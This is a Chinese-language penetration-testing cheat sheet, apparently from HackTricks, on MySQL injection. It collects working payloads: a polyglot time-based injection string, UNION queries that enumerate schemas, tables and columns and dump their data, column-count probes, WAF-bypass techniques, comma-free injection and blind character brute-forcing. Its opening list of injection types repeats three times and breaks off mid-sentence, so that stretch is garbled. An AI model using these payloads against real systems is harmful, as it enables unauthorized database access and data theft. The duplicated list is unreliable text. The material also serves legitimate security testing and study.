- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句，从而一次性执行多个查询。

- **盲注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应来判断数据库中的数据，而不直接获取数据。

- **报错注入**：攻击者通过构造恶意的SQL查询，利用应用程序返回的错误消息来获取数据库信息。

- **时间延迟注入**：攻击者通过构造恶意的SQL查询，利用应用程序的响应时间来判断数据库中的数据。

- **堆叠注入**：攻击者通过在SQL查询中插入多个查询语句
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
从[https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)获取

## 流程

请记住，在“现代”版本的**MySQL**中，您可以将"_**information\_schema.tables**_"替换为"_**mysql.innodb\_table\_stats**_**"**（这可能对绕过WAF有用）。
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **只有一个值**

* `group_concat()`
* `Limit X,1`

### **逐个盲注**

* `substr(version(),X,1)='r'` 或者 `substring(version(),X,1)=0x70` 或者 `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **盲注添加**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## 检测列数

使用简单的ORDER语句
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点聚会。

{% embed url="https://www.rootedcon.com/" %}

## 基于MySQL的Union注入技术
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**在这里学习不同的方法来滥用Mysql注入以获取SSRF**。

## WAF绕过技巧

### Information\_schema的替代方案

请记住，在"现代"版本的**MySQL**中，您可以将_**information\_schema.tables**_替换为_**mysql.innodb\_table\_stats**_或_**sys.x$schema\_flattened\_keys**_或**sys.schema\_table\_statistics**

![](<../../../.gitbook/assets/image (154).png>)

![](<../../../.gitbook/assets/image (155).png>)

### 不使用逗号的MySQL注入

选择两列而不使用任何逗号（[https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)）：
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### 没有列名的情况下检索值

如果你知道表的名称，但不知道表内的列名，你可以尝试执行以下操作来查找有多少列：
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
假设有2列（第一列是ID，第二列是标志），您可以尝试通过逐个字符尝试来暴力破解标志的内容：
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
更多信息请参见[https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### MySQL历史

您可以在MySQL中读取表**sys.x$statement\_analysis**来查看其他执行情况

### 版本替代方案
```
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点聚会。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家网络安全公司工作吗？想要在HackTricks中宣传你的公司吗？或者你想要获取PEASS的最新版本或下载PDF版本的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
